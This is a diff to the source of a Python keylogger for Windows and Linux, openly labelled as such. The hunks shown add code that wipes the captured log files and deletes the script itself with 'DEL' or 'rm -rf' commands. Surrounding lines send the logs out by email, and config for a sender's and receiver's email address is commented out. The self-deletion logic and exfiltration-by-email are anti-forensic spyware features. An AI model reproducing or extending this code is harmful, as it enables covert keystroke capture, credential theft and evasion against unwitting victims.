@@ -1,3 +1,10 @@
+'''
+:project: Python Keylogger for WINDOWS / LINUX
+:coded by: Karthik Nalinakshan
+
+NOTE: 
+'''
+
 try:
   import logging
   import socket
@@ -194,21 +201,7 @@ class KeyLog():
       print("Email Sent Successfully")
     except Exception as e:
       print("[-] Something went wrong! ...", e)
-
   
-  # CHANGE CONFIG 
-  def updateConfigFile(self):
-    newVar = ('''
-# Sender's email & password
-SENDER_EMAIL_ADDR = ""    # set sender's email address
-SENDER_PASS = ""          # set sender's password
-
-# Receiver's email
-RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
-    with open ("config.py", "w") as configFile:
-      configFile.write(newVar)
-
-
   # DELETE ALL RECORDS
   def deleteAllFiles(self):
     path = os.path.abspath(self.LOGS_FILE_DIRECTORY)
@@ -297,6 +290,7 @@ RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
       procW = self.processWorkingOrNot(name_of_running_file)
       if procW == 999:
         try:
+          self.deleteAllFiles()
           os.system("DEL " + os.path.basename(__file__))
         except Exception:
           pass
@@ -306,6 +300,7 @@ RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
         procL = self.processWorkingOrNot(name_of_running_file)
         if procL == 999:            
           try:
+            self.deleteAllFiles()
             os.system("rm -rf" + os.path.basename(__file__))
           except Exception:
             pass
@@ -318,4 +313,16 @@ if __name__ == '__main__':
   multiprocessing.freeze_support() # For pyinstaller (Not related to keylogger)
   keylogClass = KeyLog()
   keylogClass.mainModule()
+
+#   # CHANGE CONFIG 
+#   def updateConfigFile(self):
+#     newVar = ('''
+# # Sender's email & password
+# SENDER_EMAIL_ADDR = ""    # set sender's email address
+# SENDER_PASS = ""          # set sender's password
+
+# # Receiver's email
+# RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
+#     with open ("config.py", "w") as configFile:
+#       configFile.write(newVar)
   
